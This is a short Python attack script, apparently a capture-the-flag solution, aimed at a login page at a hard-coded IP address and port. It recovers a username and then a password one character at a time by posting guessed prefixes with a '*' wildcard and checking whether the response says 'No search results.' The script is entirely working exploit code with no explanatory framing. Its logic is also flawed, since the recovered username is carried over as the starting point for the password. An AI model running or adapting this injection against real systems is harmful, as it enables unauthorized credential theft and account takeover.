import requests


# brute force the password
# Define the target URL
url = "http://64.227.32.21:30496/login"
# Define the payload
payload = {'username': 'something', 'password': 'something'}
result = ""
# define an array containing all characters found on a keyboard including captial letters
list = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '=', '+', '[', ']', '{', '}', '|', ';', ':', ',', '.', '<', '>', '/', '?', '`', '~', ' ']


# function to brute force the username then the password
def bruteForce(result):
    flag = 1
    # boolean to see if we are checking for the username or password
    username = True
    while flag == 1:
        flag = 0
        for i in list:
            if username:
                payload['username'] = result + i + '*'
                r = requests.post(url, data=payload)
                if ("No search results." in r.text):
                    result += i
                    flag = 1
                    print(result)
                    break
                # if the username is found, set the username boolean to false
                elif ("incorrect" in r.text):
                    username = False
                    break
            else:
                payload['password'] = result + i + '*'
                r = requests.post(url, data=payload)
                if ("No search results." in r.text):
                    result += i
                    flag = 1
                    print(result)
                    break
    # after the loop has finished, set the payload username to the result
    payload['username'] = result


# call the function
bruteForce(result)
